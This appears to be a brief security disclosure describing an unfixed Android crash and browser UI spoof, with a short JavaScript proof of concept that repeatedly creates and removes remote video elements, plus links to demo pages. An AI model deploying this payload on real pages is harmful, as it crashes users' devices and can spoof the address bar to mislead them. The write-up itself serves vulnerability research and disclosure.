---
title: Android Crash and UI spoof (Not fixed)
---

Android 12 (x86_64): Internal Emulator crash EXCEPTION_ACCESS_VIOLATION_WRITE  
Android 11 (x86): Emulator closes  
Android 9 (x86): Launcher crash `frameworks/av/media/libstagefright/omx/SimpleSoftOMXComponent.cpp:476 CHECK(state == OMX_StateLoaded || state == OMX_StateExecuting)` failed  

I have also had issues where the address bar or a different website in the case of a webview get shown instead of the video element.
```js
<script> onload = () => { createVideo();createVideo();createVideo();createVideo();createVideo(); } function createVideo() { let v = null; setInterval(() => { if (v) document.body.removeChild(v); v = document.createElement('video'); v.width="1000"; v.src = 'https://ndevtk.github.io/writeups/extensionRCE.mp4'; document.body.appendChild(v); }, 2000); } </script>
```
Demos: [Doge PoC](https://ndev.tk/doge/) and [Unreliable Chrome UI spoof](https://ndev.tk/video.html)
